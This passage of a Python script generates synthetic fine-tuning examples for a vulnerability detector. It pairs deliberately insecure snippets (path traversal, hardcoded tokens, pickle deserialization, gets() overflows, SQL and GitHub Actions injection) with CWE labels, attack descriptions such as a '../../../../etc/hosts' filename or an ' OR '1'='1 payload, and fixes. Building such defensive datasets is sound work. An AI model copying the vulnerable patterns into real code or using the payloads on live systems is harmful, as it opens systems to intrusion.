         'import os\nsafe = os.path.realpath(f"templates/{page}.html")\nif not safe.startswith(os.path.realpath("templates/")):\n    raise ValueError\ntemplate = open(safe).read()'),

        ("Node.js", 'const src = path.join("uploads", req.body.filename);\nres.download(src)',
         "CWE-22", "Path Traversal", "HIGH",
         "Attacker requests filename='../../../../etc/hosts' to download sensitive files.",
         'const src = path.resolve("uploads", path.basename(req.body.filename));\nres.download(src)'),

        # Hardcoded secret 변형
        ("Python", 'SLACK_TOKEN = "xoxb-123456789-abcdef"',
         "CWE-798", "Hardcoded Slack Token", "HIGH",
         "Slack bot token in source allows attacker to post messages or read channels.",
         'SLACK_TOKEN = os.environ["SLACK_TOKEN"]'),

        ("Java", 'String apiKey = "AIzaSyD-xxxxxxxxxxxxxxxxxxxxxxxx";',
         "CWE-798", "Hardcoded Google API Key", "HIGH",
         "API key committed to git allows attacker to abuse Google services at owner's cost.",
         'String apiKey = System.getenv("GOOGLE_API_KEY");'),

        # Deserialization 변형
        ("Python", 'import pickle\ncache = pickle.loads(redis.get("user_session"))',
         "CWE-502", "Insecure Deserialization from Cache", "CRITICAL",
         "Attacker poisons Redis cache with malicious pickle payload to achieve RCE.",
         'import json\ncache = json.loads(redis.get("user_session"))'),

        # Buffer overflow 변형
        ("C", 'char username[32];\ngets(username);',
         "CWE-121", "Stack Buffer Overflow via gets()", "CRITICAL",
         "gets() has no length limit; attacker provides >32 bytes to corrupt stack.",
         'char username[32];\nfgets(username, sizeof(username), stdin);'),

        ("C", 'void copy(char *dst, char *src) {\n    while (*dst++ = *src++);\n}',
         "CWE-121", "Unbounded strcpy-style Copy", "HIGH",
         "No length check allows src to overflow dst buffer on the stack.",
         'void copy(char *dst, char *src, size_t n) {\n    strncpy(dst, src, n - 1);\n    dst[n - 1] = \'\\0\';\n}'),

        # Kotlin 변형
        ("Kotlin", 'val id = intent.getStringExtra("userId")\nval user = db.rawQuery("SELECT * FROM users WHERE id=\'$id\'", null)',
         "CWE-89", "SQL Injection (Android SQLite)", "HIGH",
         "Attacker sends userId=' OR '1'='1 via intent to dump all user records.",
         'val user = db.rawQuery("SELECT * FROM users WHERE id=?", arrayOf(id))'),

        # GitHub Actions 변형
        ("GitHub Actions", '- run: echo "${{ github.event.issue.body }}"',
         "CWE-77", "GitHub Actions Issue Body Injection", "HIGH",
         "Attacker creates issue with body containing $(...) to execute shell commands.",
         '- env:\n    BODY: ${{ github.event.issue.body }}\n  run: echo "$BODY"'),

        # TypeScript 변형
        ("TypeScript/Next.js", 'const id = req.query.id as string;\nconst result = await prisma.$queryRawUnsafe(`SELECT * FROM Post WHERE id = ${id}`)',
         "CWE-89", "SQL Injection via $queryRawUnsafe", "HIGH",
         "Attacker manipulates id to inject SQL and extract or modify database records.",
         'const result = await prisma.post.findUnique({ where: { id: parseInt(id) } })'),
    ]

    for e in var_variations:
        examples.append(_make_example(*e))

    return examples


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--output", type=Path, default=OUT_DATA)
    parser.add_argument("--merge", action="store_true", help="기존 lora_train_v2.jsonl 과 합치기")
    parser.add_argument("--shuffle", action="store_true", default=True)
    args = parser.parse_args()

    new_examples = generate_all()

    all_examples = new_examples
    if args.merge and ORIG_DATA.exists():
        orig = []
        with open(ORIG_DATA) as f:
            for line in f:
                line = line.strip()
                if line:
                    orig.append(json.loads(line))
        print(f"기존 데이터: {len(orig)}건")
        all_examples = orig + new_examples

    if args.shuffle:
        random.seed(42)
        random.shuffle(all_examples)

    args.output.parent.mkdir(parents=True, exist_ok=True)
    with open(args.output, "w", encoding="utf-8") as f:
        for ex in all_examples:
            f.write(json.dumps(ex, ensure_ascii=False) + "\n")

    print(f"신규 생성: {len(new_examples)}건")
    print(f"최종 저장: {len(all_examples)}건 → {args.output}")

    # 통계
    from collections import Counter
    import re
    cwe_dist = Counter()
    lang_dist = Counter()
    sev_dist = Counter()
    for ex in all_examples:
        comp = ex["completion"]
        cwe_m = re.match(r"(CWE-\d+)", comp)
        if cwe_m:
            cwe_dist[cwe_m.group(1)] += 1
        sev_m = re.search(r"SEVERITY:\s*(\w+)", comp)
        if sev_m:
            sev_dist[sev_m.group(1)] += 1
        lang_m = re.search(r"this (.+?) code", ex["prompt"])
        if lang_m:
            lang_dist[lang_m.group(1)] += 1

    print(f"\n취약점 분포 (TOP 10): {cwe_dist.most_common(10)}")
    print(f"심각도 분포: {dict(sev_dist)}")
    print(f"언어 분포 (TOP 10): {lang_dist.most_common(10)}")


if __name__ == "__main__":
    main()
